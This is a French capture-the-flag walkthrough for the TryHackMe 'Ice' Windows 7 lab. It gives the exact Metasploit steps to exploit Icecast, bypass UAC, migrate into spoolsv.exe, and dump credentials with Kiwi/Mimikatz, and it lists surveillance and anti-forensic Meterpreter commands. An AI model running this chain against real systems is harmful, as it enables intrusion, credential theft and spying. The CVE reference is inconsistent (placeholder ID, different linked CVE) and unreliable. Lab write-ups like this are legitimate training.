# TryHackMe — Ice

**Cible** : Windows 7 — `DARK-PC`
**Objectif** : Exploiter Icecast → shell Meterpreter → privesc → dump credentials

---

## RECON

```bash
nmap -sS -sC -sV -p- -O -T4 <TARGET_IP>
```

Ports notables :

| Port | Service |
|------|---------|
| 3389 | Microsoft RDP |
| 8000 | **Icecast** (streaming media server) |

- Hostname : `DARK-PC`
- Icecast version vulnérable détectée sur port 8000

**Vulnérabilité** : Buffer overflow dans Icecast 2.0.1
- CVE : `CVE-2004-xxxx` (score CVSS **7.5**, impact score **6.4**)
- Référence : https://www.cvedetails.com/cve/CVE-2014-9091/

---

## GAIN ACCESS

```bash
msfconsole
search icecast
use exploit/windows/http/icecast_header
show options
set RHOSTS <TARGET_IP>
set LHOST tun0
exploit
```

→ Meterpreter session ouverte
→ User initial : `Dark`

### Recon post-shell 

```bash 
sysinfo # infos système (OS, hostname, architecture) 
getuid # utilisateur courant → Dark 
getprivs # liste les privileges Windows du token actif
getpid # PID du processus Meterpreter actuel 
ps # liste tous les processus (utile pour choisir la cible de migration) 
```

---

## ESCALATE

### Local Exploit Suggester

```bash
background
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

Premier exploit suggéré : `exploit/windows/local/bypassuac_eventvwr`

```bash
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set LHOST tun0
exploit
```

Vérification des privilèges :

```bash
getprivs
```

---

## LOOTING

### Migration de processus

Cible : `spoolsv.exe` (Printer Spooler) → permet d'obtenir les privilèges SYSTEM

```bash
ps                    # lister les processus
migrate <PID_spoolsv> # migrer vers spoolsv.exe
```

> LSASS (Local Security Authority Subsystem Service) = processus Windows gérant les connexions et politiques de sécurité.

### Dump des credentials avec Kiwi (Mimikatz)

```bash
load kiwi
creds_all
```

---

## POST-EXPLOITATION

Commandes Meterpreter utiles :

| Commande | Action |
|----------|--------|
| `screenshare` | Vue en temps réel de l'écran |
| `record_mic` | Enregistrement micro |
| `timestomp` | Modification des timestamps de fichiers |
| `golden_ticket_create` | Création d'un golden ticket Kerberos (via kiwi) |
| `run post/multi/manage/shell_to_meterpreter` | Upgrade shell |

### Accès RDP

Possible d'ajouter un accès RDP sur la machine compromise une fois les creds dumpés.